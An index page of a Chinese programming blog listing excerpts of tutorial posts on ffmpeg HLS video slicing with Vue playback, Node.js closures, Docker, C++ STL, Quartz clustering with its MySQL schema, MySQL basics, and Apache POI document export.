<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.121.1">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>编程大白的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="编程大白的博客">
		<meta property="og:title" content="编程大白的博客" />
<meta property="og:description" content="编程大白的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://bcdabai.github.io/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="编程大白的博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大白的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大白的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/daa8a95601e3fcf3999e1963c95b787d/" rel="bookmark">
			长时长视频java存储及vue播放解决方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		需要在B/S架构播放2G的1小时时长视频，考虑性能要做视频分片 一、大视频存储 可以把视频进行切片处理，使用的工具软件ffmpeg 把视频ts切片生成.m3u8格式的。
先去官网下载软件：https://ffmpeg.org/download.html
执行命令：ffmpeg -i ./稻香.mp4 -c:v h264 -flags +cgop -g 30 -hls_time 5 -hls_list_size 0 -hls_segment_filename index%3d.ts index.m3u8
例如时长1小时的一个文件，使用此工具按照每5秒分割一个一个的小视频，生成的每个小视频后缀都是.ts格式：
同时也会生成一个.m3u8格式的文件，这个文件就是上图这些小视频的"索引"了，记录着每一帧在哪个uri下：
这样就可以一小个视频来进行存储了。
二、大视频播放 本人使用vue3框架播放视频
使用&lt;video&gt;标签指定播放地址为m3u8那个文件就可以了，有专门的视频播放js类库，会自己解析。
我使用的是import videojs from 'video.js';。具体代码如下：
&lt;template&gt; &lt;div&gt; &lt;video id="singleVideo" class="video-js vjs-default-skin vjs-big-play-centered" &gt;&lt;/video&gt; &lt;/div&gt; &lt;/template&gt; &lt;script&gt; import 'video.js/dist/video-js.css' import videojs from 'video.js'; import 'videojs-contrib-hls' export default { name: "PlayVideo", data () { return { videoSrc: '' } }, methods: { play() { //使用 let singlePlayer = videojs("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/daa8a95601e3fcf3999e1963c95b787d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dcb6f877059ef4ab2fdcfa4fc172d2b1/" rel="bookmark">
			Node.js面试题整理-四年经验
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、Node.js语言部分 I.语言基础 1.闭包的原理 函数就是一个闭包，js的特点是可以在函数内部创建另一个函数。js可以在函数内用外部的变量，所以自然而然产生的闭包概念。
function foo(){ var local = 1 function bar(){ local++ return local } return bar } var func = foo() func() 在内部的那个函数可以引用外部的变量，但同时这个变量也无法被销毁，有消耗内存的风险。
再看一个例子
function makeAdder(x){ return function( y ){ return x + y } } var add5 = makeAdder( 5 ); var add10 = makeAdder( 10 ); console.log( add5(2) ) // 7 console.log( add10(2) ) // 12 以上示例中，我们定义了makeAdder(x) 函数，它接收一个参数x ，并返回一个新的函数。返回的函数接受一个参数y，并返回 x+y的值。
本质上讲，makeAdder 是一个工厂函数 – 它创建了将指定的值和它的参数相加求和的函数。上面的add5和add10都是闭包。它们共享相同的函数定义，但是保存了不同的词法环境。在add5的环境中，x为5，而在add10中，x则是10。
块级作用域 {}也是划分作用域的概念，和闭包略有不同。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/dcb6f877059ef4ab2fdcfa4fc172d2b1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/919c8f88d08c9d18dc556360d3f3b9a3/" rel="bookmark">
			怎么查看docker容器的ip
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、使用 docker inspect 容器ID
查看容器运行的各种数据，其中IPAddress就是容器IP
注：可使用docker inspect 容器ID | grep IPAddress来过滤数据。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/55425edd3a5c9b096263e89c50d1f81f/" rel="bookmark">
			一文详解c&#43;&#43;的stl库中string、vector、list的使用和模拟实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		提示：文章写完后，目录可以自动生成，如何生成可参考右边的帮助文档
文章目录 前言学习c++,不能只满足于简单的使用，理解底层原理至关重要，今天这篇文章就简述一下string、vector、list的简单使用和模拟实现 一、string1、为何使用string2、简述string类3、string的简单使用（1）、构造，析构和运算符重载（2）其他接口（3）、迭代器小提一句 二、vector1、vector的简单介绍2.vector的使用（1）构造（2）迭代器的使用（3）空间相关的接口（4）vector的增删查改 3、迭代器失效问题 三、list1、list的简单介绍2、list的使用3、list的迭代器 四、模拟实现，了解底层1、成员变量（1）string（2）vector（3）list 2、构造，析构和赋值重载（1）string（2）vector（3）list 3、迭代器4、reserve和resize函数5、“查”操作6、插入和删除操作7、最后一点：反向迭代器 总结 前言 提示：这里可以添加本文要记录的大概内容：
学习c++,不能只满足于简单的使用，理解底层原理至关重要，今天这篇文章就简述一下string、vector、list的简单使用和模拟实现 提示：以下是本篇文章正文内容，下面案例可供参考
一、string 1、为何使用string 在我的印象中，c语言也有字符串，标准库中也含有关于字符串的一些操作，那为何又要大费周章的搞一个string类呢。其实这些操作看似好用，其实危机四伏，str等函数是和字符串相分离的，极易造成越界访问等问题。
使用了string后，利用c++一些重载等特性，可以很舒服的，安全的对字符串进行操作。
2、简述string类 c++标准库中的string类是一种经过各种封装后得到的表示字符序列的类
它是basic_string的char类型实例化得到的
为何需要用一个模板来泛型表示出来呢，这就牵扯到不同编码规则的问题了，ascii编码中，一个byte可以表示256个英文字符，但在unicode中，所以字符都用两字节表示，这就说明了字符并不一定是char类型。
3、string的简单使用 （1）、构造，析构和运算符重载 构造函数最主要的有下面几个
构造一个空串
用c中的字符串来构造
拷贝构造：用一个已知的string对象去构造
int main() { string s("123"); string s2(s); cout &lt;&lt; s &lt;&lt; endl; cout &lt;&lt; s2 &lt;&lt; endl; return 0; } 其他的构造函数都是比较少见的，需要用时查询相关资料即可，这里就不多赘述
析构函数
单纯的释放掉string占用的那一块空间即可
重载
类似相同的*++、- -、-=等*操作均可通过直观感受快速使用出来
对于[]操作符也进行了重载，可读可写，因为重载时采取的是引用返回，当然，如果用const修饰以后就只能读了
（2）其他接口 首先就是size()和capacity()
这里推荐使用size()而不是length()，因为后续比如二叉树等就只能使用size(),尽量保持一致，size()的作用是求出字符串的长度，capacity()的作用是求出容量，也就是能存多少字符
resize()和reserve()
resize()的作用是改变字符的数量，如果是增加数量，可以用c来进行填充，如果没给c，则会用**‘\0’**来补，如果n的数量比capacty还要多，会直接报错吗？其实resize()还有扩容的能力，改变capacity的值，这就有点强买强卖的感觉了（狗头），其次还有n比size小的情况，为偷懒而生的c++会直接改变size。
reserve()就比较老实了，会兢兢业业扩容，当然如果给的n小于capacity，老实人会不予理会。
clear()和empty()
这两个就比较简单了，一个是清空字符串（注意：容量是不变的，变得是size）
另一个是判断字符串是否为空串
append和push_back
append用于追加字符串，push_back后面追加一个字符
+=可以简单，完美的替代这两位，因为+=的底层就是以它们为基础的
c_str,find和substr
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/55425edd3a5c9b096263e89c50d1f81f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7bbc9fcddf61ac77c186fd0b9bb976ea/" rel="bookmark">
			springboot整合quartz(集群环境)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		使用quartz实现定时任务，若是部署多台机器，那么到了时间点，多台服务器便会同时均开始执行定时任务，这不符合我们的功能实现。
quartz集群分为水平集群和垂直集群，水平集群即将定时任务节点部署在不同的服务器，其最大的问题就是时钟同步问题，若时钟不能同步，则会导致集群中各个节点状态紊乱，造成不可预知的后果；垂直集群则是集群各节点部署在同一台服务器，时钟同步自然不是问题，但存在单点故障问题，服务器宕机会严重影响服务的可用性。因此，要结合实际情况来考虑集群方案。
quartz集群的实现方式在于11张表，集群节点相互之间不通信，而是通过定时任务持久化加锁的方式来实现集群。
1、首先下载quartz集群需要创建的表，下载地址如下：
http://www.quartz-scheduler.org/downloads/
2、下载之后解压，进入如下目录，创建数据库表
quartz-2.2.3-distribution\quartz-2.2.3\docs\dbTables
注：若是mysql数据库，则使用上图的sql文件。
11张表功能说明：
表明功能QRTZ_CALENDARS以 Blob 类型存储 Quartz 的 Calendar 信息QRTZ_CRON_TRIGGERS存储 Cron Trigger，包括 Cron 表达式和时区信息QRTZ_FIRED_TRIGGERS存储与已触发的 Trigger 相关的状态信息，以及相联 Job 的执行信息QRTZ_PAUSED_TRIGGER_GRPS存储已暂停的 Trigger 组的信息QRTZ_SCHEDULER_STATE存储少量的有关 Scheduler 的状态信息，和别的 Scheduler 实例(假如是用于一个集群中)QRTZ_LOCKS存储程序的非观锁的信息(假如使用了悲观锁)QRTZ_JOB_DETAILS存储每一个已配置的 Job 的详细信息QRTZ_SIMPLE_TRIGGERS存储简单的 Trigger，包括重复次数，间隔，以及已触的次数QRTZ_BLOG_TRIGGERSTrigger 作为 Blob 类型存储(用于 Quartz 用户用 JDBC 创建他们自己定制的 Trigger 类型，JobStore 并不知道如何存储实例的时候)QRTZ_TRIGGER_LISTENERS存储已配置的 TriggerListener 的信息QRTZ_TRIGGERS存储已配置的 Trigger 的信息 mysql中数据库表创建语句如下：
DROP TABLE IF EXISTS QRTZ_FIRED_TRIGGERS; DROP TABLE IF EXISTS QRTZ_PAUSED_TRIGGER_GRPS; DROP TABLE IF EXISTS QRTZ_SCHEDULER_STATE; DROP TABLE IF EXISTS QRTZ_LOCKS; DROP TABLE IF EXISTS QRTZ_SIMPLE_TRIGGERS; DROP TABLE IF EXISTS QRTZ_SIMPROP_TRIGGERS; DROP TABLE IF EXISTS QRTZ_CRON_TRIGGERS; DROP TABLE IF EXISTS QRTZ_BLOB_TRIGGERS; DROP TABLE IF EXISTS QRTZ_TRIGGERS; DROP TABLE IF EXISTS QRTZ_JOB_DETAILS; DROP TABLE IF EXISTS QRTZ_CALENDARS; CREATE TABLE QRTZ_JOB_DETAILS( SCHED_NAME VARCHAR(120) NOT NULL, JOB_NAME VARCHAR(200) NOT NULL, JOB_GROUP VARCHAR(200) NOT NULL, DESCRIPTION VARCHAR(250) NULL, JOB_CLASS_NAME VARCHAR(250) NOT NULL, IS_DURABLE VARCHAR(1) NOT NULL, IS_NONCONCURRENT VARCHAR(1) NOT NULL, IS_UPDATE_DATA VARCHAR(1) NOT NULL, REQUESTS_RECOVERY VARCHAR(1) NOT NULL, JOB_DATA BLOB NULL, PRIMARY KEY (SCHED_NAME,JOB_NAME,JOB_GROUP)) ENGINE=InnoDB; CREATE TABLE QRTZ_TRIGGERS ( SCHED_NAME VARCHAR(120) NOT NULL, TRIGGER_NAME VARCHAR(200) NOT NULL, TRIGGER_GROUP VARCHAR(200) NOT NULL, JOB_NAME VARCHAR(200) NOT NULL, JOB_GROUP VARCHAR(200) NOT NULL, DESCRIPTION VARCHAR(250) NULL, NEXT_FIRE_TIME BIGINT(13) NULL, PREV_FIRE_TIME BIGINT(13) NULL, PRIORITY INTEGER NULL, TRIGGER_STATE VARCHAR(16) NOT NULL, TRIGGER_TYPE VARCHAR(8) NOT NULL, START_TIME BIGINT(13) NOT NULL, END_TIME BIGINT(13) NULL, CALENDAR_NAME VARCHAR(200) NULL, MISFIRE_INSTR SMALLINT(2) NULL, JOB_DATA BLOB NULL, PRIMARY KEY (SCHED_NAME,TRIGGER_NAME,TRIGGER_GROUP), FOREIGN KEY (SCHED_NAME,JOB_NAME,JOB_GROUP) REFERENCES QRTZ_JOB_DETAILS(SCHED_NAME,JOB_NAME,JOB_GROUP)) ENGINE=InnoDB; CREATE TABLE QRTZ_SIMPLE_TRIGGERS ( SCHED_NAME VARCHAR(120) NOT NULL, TRIGGER_NAME VARCHAR(200) NOT NULL, TRIGGER_GROUP VARCHAR(200) NOT NULL, REPEAT_COUNT BIGINT(7) NOT NULL, REPEAT_INTERVAL BIGINT(12) NOT NULL, TIMES_TRIGGERED BIGINT(10) NOT NULL, PRIMARY KEY (SCHED_NAME,TRIGGER_NAME,TRIGGER_GROUP), FOREIGN KEY (SCHED_NAME,TRIGGER_NAME,TRIGGER_GROUP) REFERENCES QRTZ_TRIGGERS(SCHED_NAME,TRIGGER_NAME,TRIGGER_GROUP)) ENGINE=InnoDB; CREATE TABLE QRTZ_CRON_TRIGGERS ( SCHED_NAME VARCHAR(120) NOT NULL, TRIGGER_NAME VARCHAR(200) NOT NULL, TRIGGER_GROUP VARCHAR(200) NOT NULL, CRON_EXPRESSION VARCHAR(120) NOT NULL, TIME_ZONE_ID VARCHAR(80), PRIMARY KEY (SCHED_NAME,TRIGGER_NAME,TRIGGER_GROUP), FOREIGN KEY (SCHED_NAME,TRIGGER_NAME,TRIGGER_GROUP) REFERENCES QRTZ_TRIGGERS(SCHED_NAME,TRIGGER_NAME,TRIGGER_GROUP)) ENGINE=InnoDB; CREATE TABLE QRTZ_SIMPROP_TRIGGERS ( SCHED_NAME VARCHAR(120) NOT NULL, TRIGGER_NAME VARCHAR(200) NOT NULL, TRIGGER_GROUP VARCHAR(200) NOT NULL, STR_PROP_1 VARCHAR(512) NULL, STR_PROP_2 VARCHAR(512) NULL, STR_PROP_3 VARCHAR(512) NULL, INT_PROP_1 INT NULL, INT_PROP_2 INT NULL, LONG_PROP_1 BIGINT NULL, LONG_PROP_2 BIGINT NULL, DEC_PROP_1 NUMERIC(13,4) NULL, DEC_PROP_2 NUMERIC(13,4) NULL, BOOL_PROP_1 VARCHAR(1) NULL, BOOL_PROP_2 VARCHAR(1) NULL, PRIMARY KEY (SCHED_NAME,TRIGGER_NAME,TRIGGER_GROUP), FOREIGN KEY (SCHED_NAME,TRIGGER_NAME,TRIGGER_GROUP) REFERENCES QRTZ_TRIGGERS(SCHED_NAME,TRIGGER_NAME,TRIGGER_GROUP)) ENGINE=InnoDB; CREATE TABLE QRTZ_BLOB_TRIGGERS ( SCHED_NAME VARCHAR(120) NOT NULL, TRIGGER_NAME VARCHAR(200) NOT NULL, TRIGGER_GROUP VARCHAR(200) NOT NULL, BLOB_DATA BLOB NULL, PRIMARY KEY (SCHED_NAME,TRIGGER_NAME,TRIGGER_GROUP), INDEX (SCHED_NAME,TRIGGER_NAME, TRIGGER_GROUP), FOREIGN KEY (SCHED_NAME,TRIGGER_NAME,TRIGGER_GROUP) REFERENCES QRTZ_TRIGGERS(SCHED_NAME,TRIGGER_NAME,TRIGGER_GROUP)) ENGINE=InnoDB; CREATE TABLE QRTZ_CALENDARS ( SCHED_NAME VARCHAR(120) NOT NULL, CALENDAR_NAME VARCHAR(200) NOT NULL, CALENDAR BLOB NOT NULL, PRIMARY KEY (SCHED_NAME,CALENDAR_NAME)) ENGINE=InnoDB; CREATE TABLE QRTZ_PAUSED_TRIGGER_GRPS ( SCHED_NAME VARCHAR(120) NOT NULL, TRIGGER_GROUP VARCHAR(200) NOT NULL, PRIMARY KEY (SCHED_NAME,TRIGGER_GROUP)) ENGINE=InnoDB; CREATE TABLE QRTZ_FIRED_TRIGGERS ( SCHED_NAME VARCHAR(120) NOT NULL, ENTRY_ID VARCHAR(95) NOT NULL, TRIGGER_NAME VARCHAR(200) NOT NULL, TRIGGER_GROUP VARCHAR(200) NOT NULL, INSTANCE_NAME VARCHAR(200) NOT NULL, FIRED_TIME BIGINT(13) NOT NULL, SCHED_TIME BIGINT(13) NOT NULL, PRIORITY INTEGER NOT NULL, STATE VARCHAR(16) NOT NULL, JOB_NAME VARCHAR(200) NULL, JOB_GROUP VARCHAR(200) NULL, IS_NONCONCURRENT VARCHAR(1) NULL, REQUESTS_RECOVERY VARCHAR(1) NULL, PRIMARY KEY (SCHED_NAME,ENTRY_ID)) ENGINE=InnoDB; CREATE TABLE QRTZ_SCHEDULER_STATE ( SCHED_NAME VARCHAR(120) NOT NULL, INSTANCE_NAME VARCHAR(200) NOT NULL, LAST_CHECKIN_TIME BIGINT(13) NOT NULL, CHECKIN_INTERVAL BIGINT(13) NOT NULL, PRIMARY KEY (SCHED_NAME,INSTANCE_NAME)) ENGINE=InnoDB; CREATE TABLE QRTZ_LOCKS ( SCHED_NAME VARCHAR(120) NOT NULL, LOCK_NAME VARCHAR(40) NOT NULL, PRIMARY KEY (SCHED_NAME,LOCK_NAME)) ENGINE=InnoDB; CREATE INDEX IDX_QRTZ_J_REQ_RECOVERY ON QRTZ_JOB_DETAILS(SCHED_NAME,REQUESTS_RECOVERY); CREATE INDEX IDX_QRTZ_J_GRP ON QRTZ_JOB_DETAILS(SCHED_NAME,JOB_GROUP); CREATE INDEX IDX_QRTZ_T_J ON QRTZ_TRIGGERS(SCHED_NAME,JOB_NAME,JOB_GROUP); CREATE INDEX IDX_QRTZ_T_JG ON QRTZ_TRIGGERS(SCHED_NAME,JOB_GROUP); CREATE INDEX IDX_QRTZ_T_C ON QRTZ_TRIGGERS(SCHED_NAME,CALENDAR_NAME); CREATE INDEX IDX_QRTZ_T_G ON QRTZ_TRIGGERS(SCHED_NAME,TRIGGER_GROUP); CREATE INDEX IDX_QRTZ_T_STATE ON QRTZ_TRIGGERS(SCHED_NAME,TRIGGER_STATE); CREATE INDEX IDX_QRTZ_T_N_STATE ON QRTZ_TRIGGERS(SCHED_NAME,TRIGGER_NAME,TRIGGER_GROUP,TRIGGER_STATE); CREATE INDEX IDX_QRTZ_T_N_G_STATE ON QRTZ_TRIGGERS(SCHED_NAME,TRIGGER_GROUP,TRIGGER_STATE); CREATE INDEX IDX_QRTZ_T_NEXT_FIRE_TIME ON QRTZ_TRIGGERS(SCHED_NAME,NEXT_FIRE_TIME); CREATE INDEX IDX_QRTZ_T_NFT_ST ON QRTZ_TRIGGERS(SCHED_NAME,TRIGGER_STATE,NEXT_FIRE_TIME); CREATE INDEX IDX_QRTZ_T_NFT_MISFIRE ON QRTZ_TRIGGERS(SCHED_NAME,MISFIRE_INSTR,NEXT_FIRE_TIME); CREATE INDEX IDX_QRTZ_T_NFT_ST_MISFIRE ON QRTZ_TRIGGERS(SCHED_NAME,MISFIRE_INSTR,NEXT_FIRE_TIME,TRIGGER_STATE); CREATE INDEX IDX_QRTZ_T_NFT_ST_MISFIRE_GRP ON QRTZ_TRIGGERS(SCHED_NAME,MISFIRE_INSTR,NEXT_FIRE_TIME,TRIGGER_GROUP,TRIGGER_STATE); CREATE INDEX IDX_QRTZ_FT_TRIG_INST_NAME ON QRTZ_FIRED_TRIGGERS(SCHED_NAME,INSTANCE_NAME); CREATE INDEX IDX_QRTZ_FT_INST_JOB_REQ_RCVRY ON QRTZ_FIRED_TRIGGERS(SCHED_NAME,INSTANCE_NAME,REQUESTS_RECOVERY); CREATE INDEX IDX_QRTZ_FT_J_G ON QRTZ_FIRED_TRIGGERS(SCHED_NAME,JOB_NAME,JOB_GROUP); CREATE INDEX IDX_QRTZ_FT_JG ON QRTZ_FIRED_TRIGGERS(SCHED_NAME,JOB_GROUP); CREATE INDEX IDX_QRTZ_FT_T_G ON QRTZ_FIRED_TRIGGERS(SCHED_NAME,TRIGGER_NAME,TRIGGER_GROUP); CREATE INDEX IDX_QRTZ_FT_TG ON QRTZ_FIRED_TRIGGERS(SCHED_NAME,TRIGGER_GROUP); commit; 3、创建springboot项目 ①pom.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7bbc9fcddf61ac77c186fd0b9bb976ea/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d879d98800cda9a986934b43a8095b16/" rel="bookmark">
			MySQL基础知识
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
MySQL的复制原理以及流程
主线程binlog
从线程io
sql执行线程(从)
mysql主从复制详解
Mysql主从复制的实现原理图大致如下
Mysql中的myisam与innodb的区别
InnoDB引擎的四大特性
InooDB和MyISAM的select count（*）哪个更快
MySQL事务的4种隔离级别
读未提交产生脏读问题：
读已提交
可重复读
可串行化
B+树索引和哈希索引的区别
哈希索引的优势：
哈希索引不适用的场景：
B树和B+树的区别
MySQL联合索引
MySQL分区
什么是表分区
表分区与分表的区别
表分区有什么好处？
分区表的限制因素
Mysql支持的分区类型有哪些
行级锁定的优点
行级锁定的缺点
Mysql优化
MySQL的复制原理以及流程 基本原理流程，3个线程以及之间的关联；
主线程binlog 记录下所有改变了数据库数据的语句，放进master上的binlog中；
从线程io 在使用start slave 之后，负责从master上拉取 binlog 内容，放进 自己的relay log中；
sql执行线程(从) 执行relay log中的语句；
mysql主从复制详解 MySQL数据库自身提供的主从复制功能可以方便的实现数据的多处自动备份，实现数据库的拓展。多个数据备份不仅可以加强数据的安全性，通过实现读写分离还能进一步提升数据库的负载性能。
下图就描述了一个多个数据库间主从复制与读写分离的模型(来源网络)：
在一主多从的数据库体系中，多个从服务器采用异步的方式更新主数据库的变化，业务服务器在执行写或者相关修改数据库的操作是在主服务器上进行的，读操作则是在各从服务器上进行。如果配置了多个从服务器或者多个主服务器又涉及到相应的负载均衡问题。
Mysql主从复制的实现原理图大致如下 MySQL之间数据复制的基础是二进制日志文件（binary log file）。一台MySQL数据库一旦启用二进制日志后，其作为master，它的数据库中所有操作都会以“事件”的方式记录在二进制日志中，其他数据库作为slave通过一个I/O线程与主服务器保持通信，并监控master的二进制日志文件的变化，如果发现master二进制日志文件发生变化，则会把变化复制到自己的中继日志中，然后slave的一个SQL线程会把相关的“事件”执行到自己的数据库中，以此实现从数据库和主数据库的一致性，也就实现了主从复制。 Mysql中的myisam与innodb的区别 InooDB支持事务，而MyISAM不支持事务InnoDB支持行级锁，而MyISAM支持表级锁InnoDB支持MVCC，而MyISAM不支持InnoDB支持外键，而MyISAM不支持InnoDB不支持全文索引，而MyISAM支持 InnoDB引擎的四大特性 插入缓冲，二次写，自适应哈希索引，预读
InooDB和MyISAM的select count（*）哪个更快 myisam更快，因为myisam内部维护了一个计算器，可以直接调取。MyISAM的索引和数据是分开的，并且索引是有压缩的，内存使用率就对应提高了不少。能加载更多索引，而Innodb是索引和数据是紧密捆绑的，没有使用压缩从而会造成Innodb比MyISAM体积庞大不小。
MySQL事务的4种隔离级别 读未提交读已提交可重复读串行化 读未提交产生脏读问题： #首先，修改隔离级别 set tx_isolation='READ-UNCOMMITTED'; select @@tx_isolation; +------------------+ | @@tx_isolation | +------------------+ | READ-UNCOMMITTED | +------------------+ #事务A：启动一个事务 start transaction; select * from tx; +------+------+ | id | num | +------+------+ | 1 | 1 | | 2 | 2 | | 3 | 3 | +------+------+ #事务B：也启动一个事务(那么两个事务交叉了) 在事务B中执行更新语句，且不提交 start transaction; update tx set num=10 where id=1; select * from tx; +------+------+ | id | num | +------+------+ | 1 | 10 | | 2 | 2 | | 3 | 3 | +------+------+ #事务A：那么这时候事务A能看到这个更新了的数据吗?
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d879d98800cda9a986934b43a8095b16/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3502d7c1bb01db490df11f69693ed8b2/" rel="bookmark">
			Python3（二）：开发工具 IDEA配置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 因为一直使用IDEA进行Java开发，对IDEA相对熟悉，上手比较快，所以就选择了IDEA进行相关的Python脚本编写。当然也可以选择vsCode，PyCharm等工具。
本文主要介绍IDEA配置及如何创建Python项目。
一、下载安装Python插件 二、配置Python SDK 选择本地安装的Python环境即可。
三、创建Python项目 File -&gt; Project，选择Project SDK，一路Next，然后设置项目名和项目路径，最后点击finish。
Django：免费开源的Python Web框架，可以快速搭建高性能，优雅的网站
Google App Engine: 可以在 Google 的基础架构上运行网络应用程序
SQL Support: 支持SQL的框架
四、创建Python文件 在项目上右键 -&gt; New -&gt; Python File
五、编写脚本并执行 总结 以上就是IDEA配置Python，及如何创建Python工程和运行Python脚本。Python入门相对来说是比较简单的，有别的语言基础的同学，基本花个半天时间就可以了。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f5c81951346517f7a6adeeda50ae0257/" rel="bookmark">
			POI技术实现文件的导入导出
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、POI简介：
Apache POI的定义是Poor Obfuscation Implementation”首字母的缩写，即“简单的模糊实现”。
二、用途：
使用java解析和创建office文档的工具. 常用于处理excel文件等。
三、常用API放在最后。。。。
四、代码实现文件导入流程：
1.导入相关依赖：
2.编写yml配置文件：（特别提请：使用mysql8.0需要在url上指定时区）
server: port: 8888 servlet: path: /testOne spring: datasource: url: jdbc:mysql://localhost:3306/test?serverTimezone=UTC driver-class-name: com.mysql.cj.jdbc.Driver username: root password: 123456 servlet: multipart: max-file-size: 10MB max-request-size: 100MB 3.创建实体：
4.编写链接数据库访问层：
@Mapper public interface PeopleMessagesDao{ //导入数据 @Insert("insert into infisa_people_messages values" + "(default,#{name},#{sex},#{age},#{birhDate},#{address},#{remark})") int addAll(PeopleMessages p); //查询要导出的数据 @Select("select id,name,sex,age,birth_date as birhDate,address,remark " + "from infisa_people_messages ") List&lt;PeopleMessages&gt; findAll(); } 5.编写业务层接口及实现：
@Service public class IPeopleMessagesImpl implements PeopleMessagesService { private Logger logger= LoggerFactory.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f5c81951346517f7a6adeeda50ae0257/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b3312222b7643784f180b6f88e2e5351/" rel="bookmark">
			使用POI-TL实现word的下载。
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言：POI-TL（poi template language）是Word模板引擎，基于Microsoft Word模板和数据生成新的文档。前面文章提到过使用POI技术实现excel的导入导出。那么这次说下word的下载。
一、简单介绍一下poi-tl标签：
在poi-tl 1.12版本
&lt;dependency&gt; &lt;groupId&gt;com.deepoove&lt;/groupId&gt; &lt;artifactId&gt;poi-tl&lt;/artifactId&gt; &lt;version&gt;1.12.1&lt;/version&gt; &lt;/dependency&gt; 1、文本：{{text}}
String ：文本TextRenderData ：有样式的文本HyperlinkTextRenderData ：超链接和锚点文本Object ：调用 toString() 方法转化为文本 对应java代码：
put("name", "张三"); put("author", new TextRenderData("000000", "张三")); put("link", new HyperlinkTextRenderData("website", "http://www.baidu.com")); 2、图片：{{@image}}
String ：图片url或者本地路径，默认使用图片自身尺寸PictureRenderDataByteArrayPictureRenderDataFilePictureRenderDataUrlPictureRenderData 对应java代码：
// 指定图片路径 put("image", "logo.png"); // svg图片 put("svg", "https://img0.baidu.com/it/u=2776854325,1960063339&amp;fm=253&amp;fmt=auto&amp;app=120&amp;f=JPEG?w=640&amp;h=360"); // 设置图片宽高 put("image1", Pictures.ofLocal("logo.png").size(120, 120).create()); // 图片流 put("streamImg", Pictures.ofStream(new FileInputStream("logo.jpeg"), PictureType.JPEG).size(100, 120).create()); // 网络图片(注意网络耗时对系统可能的性能影响) put("urlImg", Pictures.ofUrl("http://deepoove.com/images/icecream.png").size(100, 100).create()); // java图片 put("buffered", Pictures.ofBufferedImage(bufferImage, PictureType.PNG).size(100, 100).create()); 3、表格：{{#table}}
TableRenderData 对应java代码：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b3312222b7643784f180b6f88e2e5351/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/579d46c61c0a874415933fe974124b09/" rel="bookmark">
			Vue 常用的修饰符有哪些？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、修饰符是什么 在程序世界里，修饰符是用于限定类型以及类型成员的声明的一种符号。
在Vue中，修饰符处理了许多DOM事件的细节，让我们不再需要花大量的时间去处理这些烦恼的事情，而能有更多的精力专注于程序的逻辑处理
vue中修饰符分为以下五种：
表单修饰符事件修饰符鼠标按键修饰符键值修饰符v-bind修饰符 二、修饰符的作用 表单修饰符 在我们填写表单的时候用得最多的是input标签，指令用得最多的是v-model
关于表单的修饰符有如下：
lazytrimnumber lazy
在我们填完信息，光标离开标签的时候，才会将值赋予给value，也就是在change事件之后再进行信息同步
trim
自动过滤用户输入的首空格字符，而中间的空格不会过滤
number
自动将用户的输入值转为数值类型，但如果这个值无法被parseFloat解析，则会返回原来的值
&lt;input type="text" v-model.lazy="value"&gt; &lt;input type="text" v-model.trim="value"&gt; &lt;input v-model.number="age" type="number"&gt; 事件修饰符 事件修饰符是对事件捕获以及目标进行了处理，有如下修饰符：
